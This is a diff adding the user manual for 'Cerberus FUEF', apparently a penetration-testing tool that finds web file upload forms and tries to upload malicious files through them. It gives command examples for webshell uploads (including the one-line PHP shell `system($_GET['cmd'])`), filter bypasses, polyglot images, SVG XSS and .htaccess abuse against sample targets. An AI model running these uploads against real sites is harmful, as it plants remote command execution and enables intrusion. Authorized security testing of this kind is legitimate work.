@@ -1,0 +1,124 @@
+USER MANUAL
+===========
+
+Cerberus FUEF is designed to be intuitive. All interactions are performed via the Command Line Interface (CLI).
+
+COMMAND STRUCTURE
+-----------------
+The general syntax is:
+
+    python3 -m cerberus_fuef.main [COMMAND] [OPTIONS]
+
+GLOBAL OPTIONS
+--------------
+These options apply to all commands:
+
+*   `--proxy URL`       : Route traffic through a proxy (e.g., Burp Suite).
+*   `--cookie "KEY=VAL"`: Add session cookies (e.g., "PHPSESSID=xyz; security=low").
+*   `--header "Key: Val"`: Add custom headers (can be used multiple times).
+*   `--timeout SEC`     : Set request timeout (default: 10s).
+*   `--verbose`         : Enable detailed logging of requests and responses.
+
+--------------------------------------------------------------------------------
+
+1. DETECT
+---------
+Scans a web page to find file upload forms and extract their details (URL, fields, method).
+
+**Basic Usage:**
+    python3 -m cerberus_fuef.main detect --url https://target.com/contact
+
+**With Custom Cookies (Authenticated Scan):**
+    python3 -m cerberus_fuef.main detect \
+        --url https://target.com/admin/upload \
+        --cookie "PHPSESSID=a1b2c3d4e5; admin=true"
+
+**With Proxy (Burp Suite):**
+    python3 -m cerberus_fuef.main detect \
+        --url https://target.com/upload \
+        --proxy http://127.0.0.1:8080
+
+--------------------------------------------------------------------------------
+
+2. FINGERPRINT
+--------------
+Sends harmless test files to an upload endpoint to determine what extensions and file types are allowed.
+
+**Basic Fingerprint:**
+    python3 -m cerberus_fuef.main fingerprint \
+        --endpoint https://target.com/upload.php \
+        --field file
+
+**Specify HTTP Method:**
+    python3 -m cerberus_fuef.main fingerprint \
+        --endpoint https://target.com/api/v1/upload \
+        --field avatar \
+        --method PUT
+
+--------------------------------------------------------------------------------
+
+3. ATTACK
+---------
+The core feature. Attempts to upload a payload using various bypass techniques.
+
+**Required Arguments:**
+*   `--endpoint`: The URL where the file is posted.
+*   `--field`: The name of the file input parameter.
+*   `--payload`: The type of payload to use.
+
+**Available Payloads:**
+*   `test-txt`          : Harmless text file (good for testing access).
+*   `php-webshell`      : Simple PHP shell (`<?php system($_GET['cmd']); ?>`).
+*   `asp-webshell`      : ASPX shell.
+*   `jsp-webshell`      : JSP shell.
+*   `php-image-polyglot`: Valid GIF with hidden PHP code.
+*   `svg-xss`           : SVG with JavaScript XSS payload.
+*   `htaccess-php`      : Malicious .htaccess to enable PHP execution.
+
+**SCENARIO 1: Standard PHP Shell Upload**
+    python3 -m cerberus_fuef.main attack \
+        --endpoint https://target.com/upload.php \
+        --field file \
+        --payload php-webshell \
+        --verify
+
+**SCENARIO 2: "Max Level" Bypass Attack**
+(Tries Double Extensions, Null Bytes, MIME Spoofing, etc.)
+    python3 -m cerberus_fuef.main attack \
+        --endpoint https://target.com/upload.php \
+        --field file \
+        --payload php-webshell \
+        --use-bypass-strategy all \
+        --verify \
+        --output report.html
+
+**SCENARIO 3: Polyglot Upload (Bypass Image Filters)**
+    python3 -m cerberus_fuef.main attack \
+        --endpoint https://target.com/gallery/upload \
+        --field image \
+        --payload php-image-polyglot \
+        --verify
+
+**SCENARIO 4: Stored XSS via SVG**
+    python3 -m cerberus_fuef.main attack \
+        --endpoint https://target.com/profile/upload \
+        --field avatar \
+        --payload svg-xss \
+        --verify
+
+**SCENARIO 5: Authenticated Attack through Proxy**
+    python3 -m cerberus_fuef.main attack \
+        --endpoint https://internal.target.com/upload \
+        --field doc \
+        --payload asp-webshell \
+        --cookie "session_id=secret" \
+        --proxy http://127.0.0.1:8080 \
+        --verbose
+
+--------------------------------------------------------------------------------
+
+TIPS FOR SUCCESS
+----------------
+*   **Always Verify**: Use `--verify` to have the tool automatically check if the uploaded file is accessible.
+*   **Generate Reports**: Use `--output report.html`. The report contains generated `curl` commands for every successful attack, allowing you to manually reproduce the exploit instantly.
+*   **Check Paths**: If verification fails, the tool tries common paths (uploads/, images/, etc.). If you know the upload path, you can try to access the filename manually.
